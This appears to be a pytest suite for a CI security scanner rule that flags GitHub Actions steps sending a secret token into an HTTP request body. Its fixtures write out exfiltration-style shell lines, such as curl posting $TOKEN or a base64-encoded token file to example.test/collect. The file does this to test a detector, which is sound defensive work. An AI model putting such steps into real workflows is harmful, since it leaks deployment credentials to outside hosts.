"""Authored contrasts for the bounded secret-to-request-body profile.

These fixtures check a contract; they do not measure field accuracy.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from taintly.engine import scan_file
from taintly.models import IncompletePatternMatches, Platform, Severity
from taintly.rules.github.secret_network_flow import SecretNetworkFlowPattern
from taintly.rules.registry import load_rules_for_platform


def _workflow(
    tmp_path: Path,
    scripts: list[str],
    *,
    guards: list[str | None] | None = None,
    secret: str = "${{ secrets.DEPLOY_TOKEN }}",
) -> Path:
    path = tmp_path / ".github" / "workflows" / "ci.yml"
    path.parent.mkdir(parents=True, exist_ok=True)
    steps = ""
    for index, script in enumerate(scripts):
        guard = guards[index] if guards else None
        steps += (
            "      - name: bounded step\n"
            + (f"        if: {guard}\n" if guard else "")
            + "        shell: bash\n"
            + "        env:\n"
            + f"          TOKEN: {secret}\n"
            + "        run: |\n"
            + "".join(f"          {line}\n" for line in script.splitlines())
        )
    path.write_text(
        "name: test\non: workflow_dispatch\njobs:\n  check:\n"
        "    runs-on: ubuntu-latest\n    steps:\n" + steps,
        encoding="utf8",
    )
    return path


def _matches(path: Path):
    source = path.read_text(encoding="utf8")
    return SecretNetworkFlowPattern().check_with_filepath(source, source.splitlines(), str(path))


def test_direct_body_flow_is_review_level_with_source_note(tmp_path: Path) -> None:
    path = _workflow(tmp_path, ['A="$TOKEN"\ncurl https://example.test/collect --data "$A"'])
    findings = scan_file(str(path), load_rules_for_platform(Platform.GITHUB))
    selected = [finding for finding in findings if finding.rule_id == "SEC6-GH-019"]
    assert len(selected) == 1
    assert selected[0].severity == Severity.MEDIUM
    assert selected[0].review_needed
    assert "secret-env-binding" in " ".join(selected[0].context_notes)
    assert "http-request-body" in " ".join(selected[0].context_notes)


def test_file_base64_and_next_step_reach_body(tmp_path: Path) -> None:
    path = _workflow(
        tmp_path,
        [
            'echo "TOKEN=$TOKEN" > /tmp/plain.txt\nbase64 -w0 /tmp/plain.txt > /tmp/encoded.txt',
            "curl -s -X POST https://example.test/collect --data-binary @/tmp/encoded.txt || true",
        ],
    )
    assert len(_matches(path)) == 1
    note = SecretNetworkFlowPattern().context_notes_for_matches(
        path.read_text(encoding="utf8"), str(path), _matches(path)
    )[0]
    assert note is not None
    assert "base64-file-transform" in note.notes[0]


def test_token_used_as_api_body_is_review_level_not_high(tmp_path: Path) -> None:
    path = _workflow(
        tmp_path, ['curl https://example.test/oauth/token --data "client_secret=$TOKEN"']
    )
    findings = scan_file(str(path), load_rules_for_platform(Platform.GITHUB))
    selected = [finding for finding in findings if finding.rule_id == "SEC6-GH-019"]
    assert len(selected) == 1
    assert selected[0].severity == Severity.MEDIUM
    assert selected[0].review_needed


def test_secret_env_without_outbound_body_has_no_path(tmp_path: Path) -> None:
    assert not _matches(_workflow(tmp_path, ['echo "$TOKEN" > /tmp/local.txt']))


@pytest.mark.parametrize(
    "script",
    [
        'curl -H "Authorization: Bearer $TOKEN" https://example.test/api --data "status=ready"',
        "curl https://example.test/collect --data '$TOKEN'",
        'echo "$TOKEN" > /tmp/private.txt\ncurl https://example.test/api --data-binary @/tmp/public.txt',
        'echo "$TOKEN" > /tmp/payload.txt\necho public > /tmp/payload.txt\ncurl https://example.test/api --data-binary @/tmp/payload.txt',
        'echo "$TOKEN" > /tmp/payload.txt\ncurl https://example.test/api --data-raw @/tmp/payload.txt',
        'echo "$TOKEN" > /tmp/payload.txt\nsource ./unknown.sh\ncurl https://example.test/api --data-binary @/tmp/payload.txt',
    ],
)
def test_auth_unrelated_and_unresolved_paths_do_not_claim_flow(tmp_path: Path, script: str) -> None:
    assert not _matches(_workflow(tmp_path, [script]))


def test_guarded_steps_do_not_join(tmp_path: Path) -> None:
    path = _workflow(
        tmp_path,
        [
            'echo "$TOKEN" > /tmp/payload.txt',
            "curl https://example.test/collect --data-binary @/tmp/payload.txt",
        ],
        guards=["github.ref == 'refs/heads/main'", "github.ref == 'refs/heads/dev'"],
    )
    assert not _matches(path)


def test_unknown_step_cuts_cross_step_state(tmp_path: Path) -> None:
    path = _workflow(
        tmp_path,
        [
            'echo "$TOKEN" > /tmp/payload.txt',
            "source ./unknown.sh",
            "curl https://example.test/collect --data-binary @/tmp/payload.txt",
        ],
    )
    assert not _matches(path)


def test_inline_source_without_matching_file_is_unresolved(tmp_path: Path) -> None:
    path = _workflow(tmp_path, ['curl https://example.test/collect --data "$TOKEN"'])
    changed = path.read_text(encoding="utf8").replace("collect", "changed")
    result = SecretNetworkFlowPattern().check_with_filepath(
        changed, changed.splitlines(), str(path)
    )
    assert isinstance(result, IncompletePatternMatches)


def test_unbound_pattern_call_is_unresolved(tmp_path: Path) -> None:
    source = _workflow(tmp_path, ['curl https://example.test/collect --data "$TOKEN"']).read_text(
        encoding="utf8"
    )
    result = SecretNetworkFlowPattern().check(source, source.splitlines())
    assert isinstance(result, IncompletePatternMatches)
    assert not result


def test_nonsecret_override_does_not_inherit_secret(tmp_path: Path) -> None:
    path = _workflow(
        tmp_path, ['curl https://example.test/collect --data "$TOKEN"'], secret="public"
    )
    assert not _matches(path)


def test_mutation_applicability_requires_same_run_owner(tmp_path: Path) -> None:
    source = _workflow(tmp_path, ['curl https://example.test/collect --data "$TOKEN"']).read_text(
        encoding="utf8"
    )
    pattern = SecretNetworkFlowPattern()
    assert pattern.self_test_mutation_applicable(
        source, source.replace(": ", ":  "), "whitespace_pad"
    )
    assert not pattern.self_test_mutation_applicable(
        source, source.replace(": ", ":"), "whitespace_pad"
    )
    assert pattern.self_test_mutation_applicable(source, source, "quote_swap")
